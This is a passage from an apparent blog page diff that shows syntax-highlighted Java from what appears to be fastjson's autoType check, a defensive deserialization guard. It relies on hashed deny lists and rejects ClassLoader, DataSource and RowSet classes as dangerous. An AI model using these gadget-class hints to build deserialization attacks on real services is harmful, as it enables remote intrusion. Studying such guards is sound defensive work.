+</span></span><span class="line"><span class="cl">            <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="o">...</span> <span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">BASIC</span> <span class="o">=</span> <span class="mh">0xcbf29ce484222325L</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">PRIME</span> <span class="o">=</span> <span class="mh">0x100000001b3L</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h1</span> <span class="o">=</span> <span class="o">(</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">h1</span> <span class="o">==</span> <span class="mh">0xaf64164c86024f1aL</span><span class="o">)</span> <span class="o">{</span> <span class="c1">// [
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((</span><span class="n">h1</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">-</span> <span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span> <span class="o">==</span> <span class="mh">0x9198507b5af98f0L</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">long</span> <span class="n">h3</span> <span class="o">=</span> <span class="o">(((((</span><span class="n">BASIC</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">0</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">1</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">)</span> <span class="o">^</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="mi">2</span><span class="o">))</span> <span class="o">*</span> <span class="n">PRIME</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">fullHash</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">fnv1a_64</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">internalWhite</span> <span class="o">=</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">INTERNAL_WHITELIST_HASHCODES</span><span class="o">,</span>  <span class="n">fullHash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">internalDenyHashCodes</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">internalDenyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((!</span><span class="n">internalWhite</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">expectClassFlag</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">denyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">fullHash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">continue</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">deserializers</span><span class="o">.</span><span class="na">findClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">typeMapping</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">internalWhite</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="n">clazz</span> <span class="o">!=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashMap</span><span class="o">.</span><span class="na">class</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">expectClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;type not match. &#34;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&#34; -&gt; &#34;</span> <span class="o">+</span> <span class="n">expectClass</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(!</span><span class="n">autoTypeSupport</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">c</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">denyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">// white list
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">expectClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;type not match. &#34;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&#34; -&gt; &#34;</span> <span class="o">+</span> <span class="n">expectClass</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">jsonType</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">InputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">resource</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;.&#39;</span><span class="o">,</span> <span class="sc">&#39;/&#39;</span><span class="o">)</span> <span class="o">+</span> <span class="s">&#34;.class&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">defaultClassLoader</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">is</span> <span class="o">=</span> <span class="n">defaultClassLoader</span><span class="o">.</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="n">resource</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">is</span> <span class="o">=</span> <span class="n">ParserConfig</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">().</span><span class="na">getResourceAsStream</span><span class="o">(</span><span class="n">resource</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">is</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ClassReader</span> <span class="n">classReader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ClassReader</span><span class="o">(</span><span class="n">is</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">TypeCollector</span> <span class="n">visitor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TypeCollector</span><span class="o">(</span><span class="s">&#34;&lt;clinit&gt;&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">classReader</span><span class="o">.</span><span class="na">accept</span><span class="o">(</span><span class="n">visitor</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">jsonType</span> <span class="o">=</span> <span class="n">visitor</span><span class="o">.</span><span class="na">hasJsonType</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// skip
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IOUtils</span><span class="o">.</span><span class="na">close</span><span class="o">(</span><span class="n">is</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SupportAutoType</span><span class="o">.</span><span class="na">mask</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">autoTypeSupport</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">autoTypeSupport</span>
+</span></span><span class="line"><span class="cl">                <span class="o">||</span> <span class="o">(</span><span class="n">features</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">                <span class="o">||</span> <span class="o">(</span><span class="n">JSON</span><span class="o">.</span><span class="na">DEFAULT_PARSER_FEATURE</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">jsonType</span> <span class="o">||</span> <span class="n">expectClassFlag</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">boolean</span> <span class="n">cacheClass</span> <span class="o">=</span> <span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">jsonType</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="n">cacheClass</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">jsonType</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="c1">// classloader is danger
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">DataSource</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="c1">// dataSource can load jdbc driver
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">RowSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;type not match. &#34;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&#34; -&gt; &#34;</span> <span class="o">+</span> <span class="n">expectClass</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">JavaBeanInfo</span> <span class="n">beanInfo</span> <span class="o">=</span> <span class="n">JavaBeanInfo</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">propertyNamingStrategy</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">beanInfo</span><span class="o">.</span><span class="na">creatorConstructor</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">autoTypeSupport</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(!</span><span class="n">autoTypeSupport</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
